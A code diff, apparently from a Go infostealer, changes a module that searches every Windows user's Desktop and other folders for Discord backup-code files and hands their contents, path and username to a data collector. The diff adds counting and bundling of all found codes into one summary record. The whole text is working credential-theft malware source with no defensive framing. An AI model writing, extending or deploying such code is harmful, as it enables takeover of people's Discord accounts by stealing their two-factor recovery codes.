@@ -9,6 +9,9 @@ import (
 )
 
 func Run(dataCollector *collector.DataCollector) {
+	foundCodes := 0
+	var allCodes []map[string]interface{}
+	
 	for _, user := range hardware.GetUsers() {
 		for _, dir := range []string{
 			filepath.Join(user, "Desktop"),
@@ -40,15 +43,29 @@ func Run(dataCollector *collector.DataCollector) {
 				if err != nil {
 					return nil
 				}
-				
-				// Add backup codes to collector
+
+				foundCodes++
 				codesData := map[string]interface{}{
+					"User":     strings.Split(user, "\\")[2],
 					"FilePath": path,
 					"Codes":    string(data),
 				}
-				dataCollector.AddData("discord_backup_codes", codesData)
+				allCodes = append(allCodes, codesData)
 				return nil
 			})
 		}
+	}
+
+	// Add summary of all backup codes
+	if foundCodes > 0 {
+		summaryData := map[string]interface{}{
+			"TotalCodesFound": foundCodes,
+			"CodesDetails":    allCodes,
+		}
+		dataCollector.AddData("discord_backup_codes", summaryData)
+	} else {
+		dataCollector.AddData("discord_backup_codes", map[string]interface{}{
+			"Status": "No Discord backup codes found",
+		})
 	}
 }
